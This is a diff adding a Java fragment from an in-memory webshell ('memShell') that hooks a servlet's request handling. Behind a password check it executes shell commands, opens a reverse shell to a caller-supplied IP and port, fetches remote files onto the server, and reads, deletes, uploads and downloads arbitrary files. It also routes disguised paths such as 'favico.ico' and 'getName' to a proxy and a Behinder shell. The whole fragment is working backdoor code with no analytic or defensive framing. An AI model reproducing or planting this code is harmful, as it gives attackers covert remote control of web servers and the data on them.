@@ -1,0 +1,80 @@
+	javax.servlet.http.HttpServletRequest request;
+	javax.servlet.http.HttpServletResponse response;
+	if ($args.length==3) {
+		request=$args[1];
+		response=$args[2];
+	} else {
+		request=$args[0];
+	 	response=$args[1];
+	}
+	String data=request.getParameter("data");
+	String model=request.getParameter("model");
+	String reqURI=request.getRequestURI();
+	String pathInfo=reqURI.substring(reqURI.lastIndexOf("/")+1);
+	String result="";
+
+try {
+	if (pathInfo != null && pathInfo.equals("favico.ico")) {
+		new org.memShell.Proxy().doProxy(request, response);
+		return;
+	} else if (pathInfo != null && pathInfo.equals("getName")) {
+		new org.memShell.Behinder().shell(request, response);
+		return;
+	} else if (data!=null&&data.equals(org.memShell.Agent.password)) {
+		if (model.equalsIgnoreCase("help")) {
+			result=org.memShell.Shell.help();
+		} else if (model.equalsIgnoreCase("exec")) {
+			String cmd=request.getParameter("cmd");
+			result=org.memShell.Shell.execute(cmd);
+		} else if (model.equalsIgnoreCase("connectback")) {
+			String ip=request.getParameter("ip");
+			String port=request.getParameter("port");
+			result=org.memShell.Shell.connectBack(ip, port);
+		} else if (model.equalsIgnoreCase("urldownload")){
+			String url=request.getParameter("url");
+			String path=request.getParameter("path");
+			result=org.memShell.Shell.urldownload(url, path);
+		} else if (model.equalsIgnoreCase("list")) {
+			String path=request.getParameter("path");
+			result=org.memShell.Shell.list(path);
+		} else if (model.equalsIgnoreCase("del")) {
+			String path=request.getParameter("path");
+			result=org.memShell.Shell.delete(path);
+		} else if (model.equalsIgnoreCase("show")) {
+			String path=request.getParameter("path");
+			result=org.memShell.Shell.showFile(path);
+		} else if (model.equalsIgnoreCase("download")) {
+			String path=request.getParameter("path");
+			java.io.File f = new java.io.File(path);
+			if (f.isFile()) {
+				String fileName = f.getName();
+				java.io.InputStream inStream = new java.io.FileInputStream(path);
+				response.reset();
+				response.setContentType("bin");
+				response.addHeader("Content-Disposition", "attachment; filename=\"" + fileName + "\"");
+				byte[] b = new byte[100];
+				int len;
+					while ((len = inStream.read(b)) > 0)
+						response.getOutputStream().write(b, 0, len);
+					inStream.close();
+					return;
+
+			}
+		} else if (model.equalsIgnoreCase("upload")) {
+			String path=request.getParameter("path");
+			String fileContent=request.getParameter("content");
+			String type=request.getParameter("type");
+			if (type==null||!type.equalsIgnoreCase("b"))
+				type="a";
+			result=org.memShell.Shell.upload(path, fileContent,type);
+		}
+		if (result!=null&&!result.isEmpty()&&!result.equals("null")) {
+			response.getWriter().print(result);
+		}
+		return;
+	}
+}
+catch(Exception e)
+{
+	e.printStackTrace();
+}
